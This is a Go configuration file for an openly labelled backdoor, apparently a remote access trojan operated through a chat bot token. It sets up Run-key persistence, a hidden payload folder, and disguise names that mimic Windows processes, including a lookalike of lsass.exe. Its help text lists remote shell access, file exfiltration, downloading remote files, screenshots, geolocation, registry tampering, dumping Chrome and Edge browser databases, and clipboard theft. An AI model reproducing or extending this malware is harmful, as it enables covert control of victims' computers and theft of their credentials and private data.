package config

const (

	API        = "API-TOKEN-HERE"
	MSG_REPLY  = true
	DEBUG_MODE = false
	TIMEOUT    = 30


	REMOVE_SERVICE = "rm.bat"
	PAYLOAD_PATH   = "C:\\Users\\Public\\Libraries\\"
	HKEY_STARTUP   = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
	HIDE_FILE      = false
)

var ARR_NNAME = []string{
	"MsMpEng.exe",
	"svchost.exe",
	"Isass.exe",
	"ctfmon.exe",
	"RtkAudUService64.exe",
	"System.exe",
	"MusNotifyIcon.exe",
	"Explorer.EXE",
}

const HELP = `

    
	
	/help - Show all commands.
	/kill - Kill current running backdoor.
	/remove - Self-Remove current backdoor.

	
	
	/shell, /sh <cmd> - Reverse shell from client machine.
	/download <path> - Download file from client machine.
	/webload <filename> <url> - Download file from website.
	/screen <filename> - Screenshot client display.
	/geoip <city-mmdb> - Retrieve the client geolocation from IPv4.

	/registry <method> <regname> <value> <path>

		--set		Set registry key to client machine.
		--del		Delete registry key from client machine.
	
	/browser <browser>

		--dc		Dumping Chrome browser database files.
		--dm		Dumping MS Edge browser database files.

	/clipboard - Retrieve Clipboard data from client.
`
